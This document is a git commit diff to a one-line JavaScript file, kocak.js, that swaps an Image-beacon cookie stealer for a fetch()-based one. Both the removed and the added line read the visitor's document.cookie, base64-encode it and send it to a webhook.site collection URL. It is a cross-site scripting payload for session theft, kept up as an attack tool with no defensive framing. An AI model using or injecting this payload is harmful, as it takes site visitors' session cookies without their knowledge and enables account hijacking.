653ccd1bc1faa8ff691e2a846b8825cf92994902
Muhammad Falah <144109406+FalahFaj@users.noreply.github.com>
2026-08-19 16:05:24 +0700

    Replace image loading with fetch for cookie data

--- kocak.js
+++ kocak.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/0fa6ab36-5615-4c5d-9e7a-2f1d8cecbe65?data='+btoa(document.cookie);
+fetch('https://webhook.site/0fa6ab36-5615-4c5d-9e7a-2f1d8cecbe65?c=' + btoa(unescape(encodeURIComponent(document.cookie))));
